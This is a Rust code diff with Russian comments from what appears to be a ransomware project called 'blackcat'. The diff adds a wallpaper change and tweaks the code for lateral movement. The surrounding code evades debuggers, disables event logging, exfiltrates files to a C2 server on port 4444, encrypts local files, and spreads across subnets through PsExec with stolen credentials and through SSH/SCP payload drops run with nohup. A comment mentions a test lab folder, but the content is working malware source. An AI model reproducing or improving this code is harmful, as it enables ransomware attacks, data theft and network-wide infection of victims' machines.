@@ -19,6 +19,10 @@ use std::io::{Write, Read};
 #[cfg(target_os = "windows")]
 const PSEXEC_BYTES: &[u8] = include_bytes!("../assets/PsExec.exe");
 
+// Встраиваем картинку (Убедись, что файл существует!)
+#[cfg(target_os = "windows")]
+const WALLPAPER_BYTES: &[u8] = include_bytes!("../assets/cat.png");
+
 #[derive(Parser)]
 struct Cli {
     #[command(subcommand)]
@@ -68,6 +72,28 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             if evasion::is_debugger_present() { return Ok(()); }
             let _ = evasion::disable_eventlog(); 
             
+            // --- Смена обоев (Windows) ---
+            #[cfg(target_os = "windows")]
+            {
+                let temp_dir = std::env::temp_dir();
+                let wall_path = temp_dir.join("cat.png");
+                
+                // Распаковываем картинку
+                if let Ok(mut f) = std::fs::File::create(&wall_path) {
+                    if f.write_all(WALLPAPER_BYTES).is_ok() {
+                        info!("Wallpaper unpacked to {:?}", wall_path);
+                        // Устанавливаем
+                        if let Some(path_str) = wall_path.to_str() {
+                            if let Err(e) = windows::WindowsPlatform::set_wallpaper(path_str) {
+                                warn!("Failed to set wallpaper: {}", e);
+                            } else {
+                                info!("Wallpaper changed successfully");
+                            }
+                        }
+                    }
+                }
+            }
+
             let crypto_engine = crypto::CryptoEngine::new()?;
             let master_key = hex::encode(crypto_engine.get_master_key());
             info!("Master Key generated: {}", master_key);
@@ -76,15 +102,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 let _ = exfiltration::Exfiltration::exfiltrate(&path, c2_addr, 4444, &crypto_engine);
             }
             
-            // Запуск распространения (в фоне)
             let spread_task = if spread {
                 info!("Initiating lateral movement in background...");
                 let payload_path = std::env::current_exe()
                     .map(|p| p.to_string_lossy().to_string())
                     .unwrap_or_else(|_| "blackcat.exe".to_string());
                 
-                // ИСПРАВЛЕНИЕ: Используем тот же путь path, что и локально!
-                // Чтобы на удаленной машине шифровалась та же папка (C:\TestLab\test_files)
                 let target_path_arg = path.clone();
                 
                 let mut spread_args = vec![
@@ -109,7 +132,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 None
             };
             
-            // Локальное шифрование
             let files = filesystem::scan_filesystem(&path)?;
             if !files.is_empty() {
                 info!("Encrypting {} files...", files.len());
@@ -173,7 +195,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         Commands::Spread { subnet, start_ip, end_ip, self_destruct } => {
             let sub = subnet.unwrap_or("192.168.53".to_string());
             let payload = std::env::current_exe()?.to_string_lossy().to_string();
-            // И тут тоже поправим на переданный путь, если он был бы в аргументах, но тут заглушка
             let args = vec!["encrypt".to_string(), "--path".to_string(), "C:\\Users\\Public".to_string()];
             
             auto_spread(&sub, start_ip, end_ip, &payload, &args).await?;
@@ -249,28 +270,14 @@ async fn infect_windows_host(host: &str, user: &str, pass: &str, payload: &str, 
 
     let target = format!("\\\\{}", host);
 
-    // Дополнительная надежность: копируем бинарник во временный файл, 
-    // чтобы избежать блокировки (file in use), если вдруг мы его же и запускаем.
-    let temp_payload = std::env::temp_dir().join("svc_host.exe");
-    if let Ok(_) = std::fs::copy(payload, &temp_payload) {
-        // Используем копию
-        debug!("Payload copied to temp: {:?}", temp_payload);
-    } else {
-        // Если не вышло, используем оригинал
-    }
-    let payload_to_use = if temp_payload.exists() { 
-        temp_payload.to_string_lossy().to_string() 
-    } else { 
-        payload.to_string() 
-    };
-
+    // Добавляем флаг -n 5 (таймаут) для ускорения
     let mut psexec_args = vec![
         target,
         "-accepteula".to_string(),
         "-u".to_string(), user.to_string(),
         "-p".to_string(), pass.to_string(),
-        "-s".to_string(), "-h".to_string(), "-i".to_string(), "-c".to_string(), "-f".to_string(),
-        payload_to_use, // Передаем путь к файлу
+        "-s".to_string(), "-h".to_string(), "-i".to_string(), "-c".to_string(), "-f".to_string(), "-n".to_string(), "5".to_string(),
+        payload.to_string(),
     ];
     psexec_args.extend_from_slice(args);
 
@@ -306,7 +313,6 @@ async fn infect_windows_host(host: &str, user: &str, pass: &str, payload: &str, 
     let mut sess = match ssh2::Session::new() { Ok(s) => s, Err(_) => return false };
     sess.set_tcp_stream(tcp);
     if sess.handshake().is_err() || sess.userauth_password(user, pass).is_err() { return false; }
-    
     let payload_bytes = match std::fs::read(payload) { Ok(b) => b, Err(_) => return false };
     let mut remote_file = match sess.scp_send(Path::new("/tmp/.blackcat"), 0o777, payload_bytes.len() as u64, None) {
         Ok(f) => f, Err(_) => return false
@@ -314,7 +320,6 @@ async fn infect_windows_host(host: &str, user: &str, pass: &str, payload: &str, 
     if remote_file.write_all(&payload_bytes).is_err() { return false; }
     let _ = remote_file.send_eof();
     let _ = remote_file.wait_close();
-    
     let cmd = format!("nohup /tmp/.blackcat {} >/dev/null 2>&1 &", args.join(" "));
     let mut channel = match sess.channel_session() { Ok(c) => c, Err(_) => return false };
     channel.exec(&cmd).is_ok()
